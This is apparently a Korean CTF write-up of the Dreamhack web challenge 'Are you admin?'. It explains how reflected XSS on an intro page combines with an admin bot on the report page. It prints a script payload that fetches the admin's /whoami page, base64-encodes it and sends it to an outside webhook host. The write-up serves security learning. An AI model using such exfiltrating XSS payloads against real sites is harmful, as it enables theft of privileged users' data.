---
title: "Dreamhack Web Are you admin?"
date: 2026-07-11
categories:
  - CTF
  - Web Hacking
tags:
  - XSS
---


아래 논리가 해당 문제를 푸는 데 사용하는 핵심 논리이다.

1. intro 페이지에서 xss가 작동한다
2. 관리자계정으로 whoami를 들어가면 플래그가 보인다
3. report를 통해 관리자계정을 조종할 수 있다

위의 세가지를 조합해서 "report에서 관리자봇을 조종하여 whoami의 플래그 값을 가져온다음 intro 페이지의 xss 취약점을 통해 공격자의 웹훅으로 플래그 값을 보낼 수 있다" 라는 걸 알 수 있다.

그러면 report페이지에서만 페이로드를 잘 보내면 바로 플래그를 얻을 수 있다

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/c0c3c6c5b298364ff12739294ff9bcfe9c2dbe448da5ac79320d54a994c4103f.png)

우선 이렇게 보내면 문제 없이 작동하는 걸 확인했으니 이제 xss 구문을 조금씩 넣어보자

/intro?name=<script>
fetch('/whoami')
    .then(response => response.text())
    .then(data => {fetch(`https://hnlqxwx.request.dreamhack.games?flag=${btoa(data)}`);
    });
</script>&detail=admin

 이때 혹시 모를 깨짐을 방지하기 위한 btoa(base64인코딩)을 해서 던져주면 된다.


바로 whoami를 받아서 웹훅으로 던져주면 base64인코딩된 페이지를 얻을 수 있고, 이를 디코딩하면 flag를 얻는다

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/05bce5f0ce83f9141f73ce171b83af4a1beee44de442620ca7d109b4580ac830.png)